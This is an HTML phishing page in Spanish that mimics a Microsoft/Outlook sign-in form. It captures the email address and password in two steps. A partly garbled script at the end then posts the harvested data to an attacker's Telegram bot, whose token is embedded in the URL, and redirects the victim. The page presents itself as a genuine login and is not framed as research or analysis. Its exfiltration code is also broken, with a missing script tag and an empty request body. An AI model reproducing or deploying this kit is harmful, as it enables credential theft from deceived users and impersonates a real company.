<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Home</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f3f3f3 url('fondo.svg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: #fff;
      width: 430px;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.2);
      position: relative;
      display: flex;
      flex-direction: column;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
    }

    .logo {
      margin-bottom: 20px;
    }

    .logo img {
      height: 30px;
    }

    h1 {
      font-size: 24px;
      font-weight: 600;
      margin: 0 0 10px;
      color: #1b1b1b;
    }

    p.description {
      font-size: 14px;
      margin: 0;
      color: #1b1b1b;
    }

    input[type="email"],
    input[type="password"],
    button {
      width: 100%;
      padding: 12px;
      font-size: 15px;
      border-radius: 4px;
      margin-bottom: 20px;
      display: block;
      box-sizing: border-box;
    }

    input[type="email"] {
      border: 1px solid #999;
      background-color: #fff;
      outline: none;
    }

    input[type="email"]:focus {
      border-color: #0067b8;
      box-shadow: 0 0 0 2px rgba(0,103,184,0.2);
    }

    input[type="password"] {
      border: 1px solid #ccc;
      background-color: #fff;
      outline: none;
      transition: border-color 0.3s;
    }

    input[type="password"]:focus {
      border-color: #0067b8;
      box-shadow: 0 0 0 2px rgba(0,103,184,0.2);
    }

    button {
      background-color: #0067b8;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: 600;
    }

    button:disabled {
      background-color: #8ab4f8;
      cursor: default;
    }

    .links {
      text-align: left;
      margin-bottom: 15px;
    }

    .links a,
    .bottom-text a,
    .additional-links a {
      font-size: 14px;
      color: #0067b8;
      text-decoration: none;
      font-weight: 600;
      cursor: pointer;
      display: inline-block;
      margin-bottom: 5px;
    }

    .links a:hover,
    .bottom-text a:hover,
    .additional-links a:hover {
      text-decoration: underline;
    }

    .bottom-text {
      margin-top: 20px;
      font-size: 13px;
      color: #1b1b1b;
      text-align: center;
    }

    .bottom-text span {
      margin-right: 4px;
    }

    .footer {
      position: absolute;
      bottom: 10px;
      width: 100%;
      text-align: center;
      font-size: 12px;
      color: #666;
    }

    .footer a {
      margin: 0 8px;
      color: #0067b8;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    /* Ocultar formulario de contrase√±a inicialmente */
    #password-form {
      display: none;
      flex-direction: column;
    }

    /* Bot√≥n usar otra cuenta */
    #back-button {
      background: none;
      border: none;
      color: #0067b8;
      font-size: 14px;
      cursor: pointer;
      padding: 0;
      margin-bottom: 30px;
      align-self: flex-start;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    #back-button span {
      font-size: 18px;
      line-height: 1;
    }

    /* Texto para contrase√±a */
    #password-text {
      margin-bottom: 18px;
      font-size: 14px;
      color: #666;
      text-align: center;
    }

    #password-text strong {
      color: #000;
      word-break: break-all;
    }

    /* Enlaces debajo del bot√≥n iniciar sesi√≥n */
    .additional-links {
      margin-top: 0;
      margin-bottom: 20px;
      text-align: center; /* Cambiado de left a center */
    }

  </style>
</head>
<body>
  <div class="login-container">
    <div class="header" id="header">
      <div class="logo">
        <img src="logo.png" alt="Microsoft logo" />
      </div>
      <h1 id="title">Iniciar sesi√≥n</h1>
      <p class="description" id="description">para continuar a Outlook</p>
    </div>

    <!-- Formulario Email -->
    <form id="email-form" autocomplete="off" style="display: flex; flex-direction: column;">
      <input type="email" id="email-input" placeholder="Correo electr√≥nico" required />
      <div class="links">
        <a href="#">¬øOlvidaste tu nombre de usuario?</a>
      </div>
      <button type="submit" id="next-button">Siguiente</button>
    </form>

    <!-- Formulario Contrase√±a -->
    <form id="password-form" autocomplete="off" style="display: none;">
      <button type="button" id="back-button"><span>‚Üê</span> Usar otra cuenta</button>
      <div id="password-text">
        Ingrese la contrase√±a para<br><strong id="display-email"></strong>
      </div>
      <input type="password" id="password-input" placeholder="Contrase√±a" required />
      <div class="links" style="margin-bottom: 0;">
        <a href="#">¬øOlvidaste tu contrase√±a?</a>
      </div>
      <button type="submit" id="signin-button" disabled>Siguiente</button>
      <div class="additional-links">
        <a href="#">Otras formas de iniciar sesi√≥n</a>
      </div>
    </form>

    <div class="bottom-text" id="bottom-text">
      <span>¬øEs nuevo en Microsoft?</span><a href="#">Crear una cuenta</a>
    </div>
  </div>

  <div class="footer">
    <a href="#">T√©rminos de uso</a>
    <a href="#">Privacidad y cookies</a>
    <a href="#">Contactar soporte</a>
  </div>

  <!-- Scripts internos -->
  <script>
    const emailForm = document.getElementById('email-form');
    const passwordForm = document.getElementById('password-form');
    const emailInput = document.getElementById('email-input');
    const passwordInput = document.getElementById('password-input');
    const displayEmail = document.getElementById('display-email');
    const backButton = document.getElementById('back-button');
    const title = document.getElementById('title');
    const description = document.getElementById('description');
    const bottomText = document.getElementById('bottom-text');
    const signinBtn = document.getElementById('signin-button');

    emailForm.addEventListener('submit', (e) => {
      e.preventDefault();
      displayEmail.textContent = emailInput.value;
      emailForm.style.display = 'none';
      title.style.display = 'none';
      description.style.display = 'none';
      bottomText.style.display = 'none';
      passwordForm.style.display = 'flex';
      passwordInput.focus();
    });

    backButton.addEventListener('click', () => {
      passwordForm.style.display = 'none';
      emailForm.style.display = 'flex';
      title.style.display = 'block';
      description.style.display = 'block';
      bottomText.style.display = 'block';
      passwordInput.value = '';
      signinBtn.disabled = true;
      emailInput.focus();
    });

    passwordInput.addEventListener('input', () => {
      signinBtn.disabled = passwordInput.value.trim() === '';
    });
  </script>

  <!-- Axios + Telegram integration -->
  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

      const email = document.getElementById('email-input').value;

          axios.post("https://api.telegram.org/bot7588596909:AAEv6ZNnIAsJNAcLW8KzGJJkzT33pyfWqUU/sendMessage", {

          }).then(() => {
            window.location.href = "pagina1.html";
          }).catch((err) => {
            console.error("Error al enviar a Telegram:", err);
          });
        })
        .catch((err) => {
          console.error("Error al obtener datos de IP:", err);
        });
    });
  </script>

</body>
</html>
